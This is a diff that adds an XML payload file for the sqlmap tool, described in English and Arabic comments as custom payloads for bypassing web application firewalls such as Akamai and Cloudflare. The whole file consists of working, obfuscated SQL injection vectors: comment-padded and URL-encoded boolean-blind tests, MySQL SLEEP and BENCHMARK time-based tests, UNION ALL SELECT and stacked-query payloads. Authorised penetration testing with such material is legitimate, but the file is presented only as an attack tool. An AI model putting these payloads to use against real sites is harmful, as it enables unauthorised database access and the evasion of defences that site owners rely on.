@@ -1,0 +1,145 @@
+<?xml version="1.0" encoding="UTF-8"?>
+
+<!--
+ Aya custom WAF-bypass payloads
+ - Focus on heavy / obfuscated SQLi payloads (boolean, time, UNION, stacked)
+ - Designed to help in bypassing WAFs مثل Akamai و Cloudflare وغيرهم
+
+ NOTE:
+ - هذه الملفات تتبع نفس الـ schema الأساسية لـ sqlmap payloads
+ - يتم تحميل هذه الـ payloads فقط عند استخدام الخيار --AM
+-->
+
+<root>
+    <!-- Boolean-based blind with heavy comment obfuscation -->
+    <test>
+        <title>AM - boolean-based blind with deep comment obfuscation</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND/**/([INFERENCE])/**/AND/**/[RANDNUM]=[RANDNUM]</vector>
+        <request>
+            <payload>AND/**/([RANDNUM]=[RANDNUM])/**/AND/**/[RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>AND/**/([RANDNUM]=[RANDNUM1])/**/AND/**/[RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <!-- Boolean-based blind using encoded AND -->
+    <test>
+        <title>AM - boolean-based blind with URL-encoded AND</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>%41%4E%44/**/[INFERENCE]</vector>
+        <request>
+            <payload>%41%4E%44/**/[RANDNUM]=[RANDNUM]</payload>
+        </request>
+        <response>
+            <comparison>%41%4E%44/**/[RANDNUM]=[RANDNUM1]</comparison>
+        </response>
+    </test>
+
+    <!-- Time-based blind with layered IF/SLEEP for Akamai-like WAFs -->
+    <test>
+        <title>AM - MySQL time-based blind layered IF/SLEEP (Akamai bypass style)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,9</clause>
+        <where>1</where>
+        <vector>AND/**/IF(([INFERENCE]),IF([INFERENCE],SLEEP([SLEEPTIME]),0),0)</vector>
+        <request>
+            <payload>AND/**/IF(([RANDNUM]=[RANDNUM]),IF([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]),0),0)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <!-- Time-based blind using BENCHMARK with obfuscation -->
+    <test>
+        <title>AM - MySQL time-based blind BENCHMARK with comments</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>1,2,3,8,9</clause>
+        <where>1</where>
+        <vector>AND/**/IF(([INFERENCE]),BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]')),[RANDNUM])</vector>
+        <request>
+            <payload>AND/**/BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))</payload>
+        </request>
+        <response>
+            <time>[DELAYED]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <!-- UNION-based inband SQLi with heavy obfuscation -->
+    <test>
+        <title>AM - UNION ALL SELECT with deep comment/randomization</title>
+        <stype>6</stype>
+        <level>3</level>
+        <risk>2</risk>
+        <clause>0</clause>
+        <where>2</where>
+        <vector>UNION/**/ALL/**/SELECT/**/[COLUMNS]</vector>
+        <request>
+            <payload>UNION/**/ALL/**/SELECT/**/[COLUMNS]</payload>
+            <columns>1-10</columns>
+        </request>
+        <response>
+            <union>1</union>
+        </response>
+    </test>
+
+    <!-- Stacked queries with obfuscation -->
+    <test>
+        <title>AM - stacked query SLEEP with comments (generic WAF bypass)</title>
+        <stype>4</stype>
+        <level>3</level>
+        <risk>3</risk>
+        <clause>0</clause>
+        <where>3</where>
+        <vector>;/**/SELECT/**/SLEEP([SLEEPTIME])</vector>
+        <request>
+            <payload>;/**/SELECT/**/SLEEP([SLEEPTIME])</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>MySQL</dbms>
+        </details>
+    </test>
+
+    <!-- Boolean-based blind with nested functions -->
+    <test>
+        <title>AM - boolean-based blind with nested CONCAT/SUBSTRING</title>
+        <stype>1</stype>
+        <level>3</level>
+        <risk>1</risk>
+        <clause>1,8,9</clause>
+        <where>1</where>
+        <vector>AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)</vector>
+        <request>
+            <payload>AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)</payload>
+        </request>
+        <response>
+            <comparison>AND/**/SUBSTRING(CONCAT([RANDNUM],[RANDNUM]),1,1)=SUBSTRING(CONCAT([RANDNUM1],[RANDNUM1]),1,1)</comparison>
+        </response>
+    </test>
+
+</root>
+
+
